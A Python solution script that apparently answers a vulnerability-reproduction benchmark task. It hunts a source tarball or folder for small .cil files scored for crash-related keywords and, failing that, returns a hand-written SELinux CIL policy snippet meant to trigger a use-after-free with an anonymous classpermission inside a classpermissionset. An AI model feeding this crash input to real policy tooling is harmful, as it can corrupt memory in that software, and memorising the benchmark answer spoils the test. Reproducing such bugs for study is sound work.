import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_len = 340

        if isinstance(src_path, str) and src_path:
            # Try as tarball
            try:
                if tarfile.is_tarfile(src_path):
                    with tarfile.open(src_path, "r:*") as tf:
                        data = self._find_poc_in_tar(tf, target_len)
                        if data is not None:
                            return data
            except Exception:
                pass

            # Try as directory
            if os.path.isdir(src_path):
                data = self._find_poc_in_dir(src_path, target_len)
                if data is not None:
                    return data

        # Fallback PoC if nothing found
        return self._fallback_poc()

    def _find_poc_in_tar(self, tf: tarfile.TarFile, target_len: int) -> bytes | None:
        best_exact = None  # (score, data)
        best_approx = None
        best_approx_score = float("-inf")

        for member in tf.getmembers():
            if not member.isfile():
                continue
            if member.size <= 0 or member.size > 16384:
                continue
            name_lower = member.name.lower()
            if not name_lower.endswith(".cil"):
                continue
            try:
                f = tf.extractfile(member)
            except Exception:
                continue
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue

            score = self._score_candidate(data, name_lower, target_len)
            if score is None:
                continue

            if len(data) == target_len:
                if best_exact is None or score > best_exact[0]:
                    best_exact = (score, data)
            else:
                if score > best_approx_score:
                    best_approx_score = score
                    best_approx = data

        if best_exact is not None:
            return best_exact[1]
        return best_approx

    def _find_poc_in_dir(self, root: str, target_len: int) -> bytes | None:
        best_exact = None  # (score, data)
        best_approx = None
        best_approx_score = float("-inf")

        for dirpath, _, filenames in os.walk(root):
            for filename in filenames:
                name_lower = filename.lower()
                if not name_lower.endswith(".cil"):
                    continue
                path = os.path.join(dirpath, filename)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size <= 0 or size > 16384:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                score = self._score_candidate(data, name_lower, target_len)
                if score is None:
                    continue

                if len(data) == target_len:
                    if best_exact is None or score > best_exact[0]:
                        best_exact = (score, data)
                else:
                    if score > best_approx_score:
                        best_approx_score = score
                        best_approx = data

        if best_exact is not None:
            return best_exact[1]
        return best_approx

    def _score_candidate(self, data: bytes, name_lower: str, target_len: int) -> float | None:
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            return None

        lt = text.lower()

        if "classpermission" not in lt and "classpermissionset" not in lt:
            return None

        score = 0.0

        if "classpermission" in lt:
            score += 5.0
        if "classpermissionset" in lt:
            score += 10.0
        if "(macro" in lt:
            score += 5.0
        if "anonymous" in lt or "anon" in lt:
            score += 10.0
        if "double" in lt and "free" in lt:
            score += 3.0
        if "uaf" in lt:
            score += 3.0
        if "poc" in name_lower or "crash" in name_lower:
            score += 8.0

        length = len(data)
        # Prefer length close to target
        score -= abs(length - target_len) / 80.0
        # Light penalty for larger files
        score -= length / 20000.0

        if score <= 0.0:
            return None
        return score

    def _fallback_poc(self) -> bytes:
        # Best-effort fallback PoC based on the vulnerability description
        poc = b"""\
(block anonymous_classpermission_uaf
  (class file (perms (read write getattr open)))
  (classpermission cp_read (file (read)))
  (macro use_cp_in_cps ((cp classpermission))
    (classpermissionset cps1 (cp))
  )
  (use_cp_in_cps (classpermission (file (read))))
)
"""
        return poc.strip(b"\r\n\t ")